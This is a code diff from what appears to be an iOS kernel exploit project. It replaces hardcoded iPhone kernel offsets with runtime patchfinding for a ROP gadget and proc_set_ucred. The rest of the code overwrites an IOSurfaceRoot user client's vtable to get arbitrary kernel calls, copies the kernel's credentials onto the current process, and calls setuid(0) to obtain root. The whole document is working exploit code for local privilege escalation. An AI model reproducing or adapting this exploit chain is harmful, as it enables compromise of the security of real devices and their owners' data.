@@ -211,13 +211,13 @@ void kclose(u64 kfd)
 
 // BEGIN MINEEK CHANGES
 #include "IOKit.h"
+#include "mineekpf.h"
 
 mach_port_t user_client;
 uint64_t fake_client;
 
-// These offsets are for iOS 15.4.1, n71(m)ap ( iPhone 6s ), change them!
-uint64_t add_x0_x0_0x40_ret_func = 0xfffffff005dc39e0;
-uint64_t proc_set_ucred_func = 0xfffffff00759a324;
+uint64_t add_x0_x0_0x40_ret_func = 0;
+uint64_t proc_set_ucred_func = 0;
 
 uint32_t kread32(u64 kfd, uint64_t where) {
     uint32_t out;
@@ -288,7 +288,6 @@ uint64_t dirty_kalloc(u64 kfd, size_t size) {
 }
 
 void init_kcall(u64 kfd) {
-    struct kfd* kfd_struct = (struct kfd*)kfd;
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     if (service == IO_OBJECT_NULL){
       printf(" [-] unable to find service\n");
@@ -319,9 +318,7 @@ void init_kcall(u64 kfd) {
     printf("Copied the user client over\n");
     kwrite64(kfd, fake_client, fake_vtable);
     kwrite64(kfd, uc_port + 0x48, fake_client);
-    uint64_t add_x0_x0_0x40_ret = add_x0_x0_0x40_ret_func;
-    add_x0_x0_0x40_ret += kfd_struct->info.kernel.kernel_slide;
-    kwrite64(kfd, fake_vtable+8*0xB8, add_x0_x0_0x40_ret);
+    kwrite64(kfd, fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
     printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
 }
 
@@ -370,11 +367,8 @@ void getRoot(u64 kfd, uint64_t proc_addr)
     uint64_t kern_ucred = kread64(kfd, kern_ro + 0x20);
     printf("kern_ucred @ 0x%llx\n", kern_ucred);
 
-    // use proc_set_ucred to set kernel proc.
-    uint64_t proc_set_ucred = proc_set_ucred_func;
-    proc_set_ucred += kfd_struct->info.kernel.kernel_slide;
-    printf("func @ 0x%llx\n", proc_set_ucred);
-    kcall(kfd, proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
+    // use proc_set_ucred to set kernel ucred.
+    kcall(kfd, proc_set_ucred_func, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
     setuid(0);
     setuid(0);
     printf("getuid: %d\n", getuid());
@@ -382,6 +376,16 @@ void getRoot(u64 kfd, uint64_t proc_addr)
 
 void stage2(u64 kfd)
 {
+    struct kfd* kfd_struct = (struct kfd*)kfd;
+    printf("patchfinding!\n");
+    init_kernel(kfd_struct);
+    add_x0_x0_0x40_ret_func = find_add_x0_x0_0x40_ret(kfd_struct);
+    printf("add_x0_x0_0x40_ret_func @ 0x%llx\n", add_x0_x0_0x40_ret_func);
+    assert(add_x0_x0_0x40_ret_func != 0);
+    proc_set_ucred_func = find_proc_set_ucred_function(kfd_struct);
+    printf("proc_set_ucred_func @ 0x%llx\n", proc_set_ucred_func);
+    assert(proc_set_ucred_func != 0);
+    printf("patchfinding complete!\n");
     pid_t pid = getpid();
     printf("pid = %d\n", pid);
     uint64_t proc_addr = proc_of_pid(kfd, getpid());
